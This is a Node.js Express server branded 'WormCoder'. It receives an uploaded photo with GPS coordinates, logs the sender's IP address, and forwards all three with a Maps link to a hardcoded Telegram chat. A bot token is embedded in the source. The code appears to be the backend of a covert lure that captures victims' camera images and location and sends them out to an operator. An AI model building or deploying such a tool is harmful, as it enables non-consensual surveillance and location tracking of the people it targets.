import express from 'express';
import multer from 'multer';
import TelegramBot from 'node-telegram-bot-api';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

const token = "8868449745:AAHiDxBqDci4QGK-2FmPkjP5TOAqRtacyLM";
const chatId = "6708600263";

if (!token) {
  console.error("Lỗi: Telegram Bot Token not provided!");
  process.exit(1);
}

const bot = new TelegramBot(token, { polling: false });

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).send('Không tìm thấy ảnh.');
    }

    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (clientIp && clientIp.includes(',')) {
      clientIp = clientIp.split(',')[0].trim();
    }
    if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') {
      clientIp = '127.0.0.1 (Localhost)';
    }

    const latitude = req.body.latitude || "Không rõ";
    const longitude = req.body.longitude || "Không rõ";

    let caption = `📸 Ảnh được gửi từ hệ thống WormCoder.\n`;
    caption += `🌐 Địa chỉ IP: ${clientIp}\n`;

    if (latitude !== "Không rõ" && longitude !== "Không rõ") {
      caption += `📍 Tọa độ: ${latitude}, ${longitude}\n`;
      caption += `🗺️ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
    } else {
      caption += `⚠️ Không thể lấy được thông tin định vị.`;
    }

    await bot.sendPhoto(chatId, req.file.buffer, {
      caption: caption
    });

    res.status(200).send({ success: true });
  } catch (error) {
    console.error("Lỗi xử lý:", error);
    res.status(500).send({ success: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

